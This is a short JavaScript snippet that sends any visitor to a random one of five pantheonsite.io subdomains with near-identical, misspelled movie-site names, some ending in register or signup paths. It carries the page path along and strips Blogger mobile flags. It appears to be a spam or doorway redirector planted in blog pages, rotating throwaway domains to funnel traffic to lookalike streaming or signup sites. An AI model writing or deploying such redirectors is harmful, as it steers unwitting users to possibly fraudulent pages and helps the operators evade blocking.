var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [

"https://dev-neomoviefj.pantheonsite.io/visitourwebsite",
"https://dev-filmflixss.pantheonsite.io/",
"https://dev-neoflimfj.pantheonsite.io/register",
"https://dev-neofilmfj.pantheonsite.io/signup",
"https://dev-filmfj.pantheonsite.io/"

];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
